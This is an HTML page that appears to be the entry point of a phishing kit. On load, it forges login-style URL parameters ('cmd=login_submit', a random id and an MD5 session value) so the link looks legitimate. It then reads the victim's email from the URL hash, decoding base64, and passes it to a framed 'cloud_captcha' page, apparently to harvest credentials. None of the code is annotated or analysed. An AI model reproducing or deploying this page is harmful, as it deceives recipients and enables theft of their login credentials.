

<!DOCTYPE html>
<html style="margin:0;padding:0;height:100%">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/core.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
  
  <script>
  var loading = true;
  if(loading) {
      var href = window.location.href;
      var regex = new RegExp("[&\\?]cmd=");
      if (regex.test(href)) {
      } else {
          let rand =  Math.random() * 1000000000;
          var md5 = CryptoJS.MD5(rand);
          window.location.href = href.replace(/]/g, '') + `&em=cmd=login_submit&id=${rand + rand}&session=${md5 + md5}`
          loading = false;
      }
  }
</script>    
</head>
<body style="margin:0;padding:0;height:100%">
    <iframe id="contentFrame" 
            style="width:100%;height:100%;border:none"
            sandbox="allow-scripts allow-same-origin allow-forms allow-top-navigation"
            allow="fullscreen">
    </iframe>

    <script>
        // Get the email from URL hash
        const hash = window.location.hash.slice(1);
        let email = '';
        
        if (hash) {
            try {
                // Try to decode base64 if needed, otherwise use raw
                if (/^[A-Za-z0-9+/=]+={0,2}$/.test(hash)) {
                    email = atob(hash);
                } else {
                    email = hash;
                }
            } catch(e) {
                email = hash;
            }
        }
        
        // Build the iframe URL
        const iframe = document.getElementById('contentFrame');
        let src = 'file.html';
        
        if (email) {
            src = `cloud_captcha.html#${email}`;
        }
        
        iframe.src = src;
    </script>
</body>
</html>
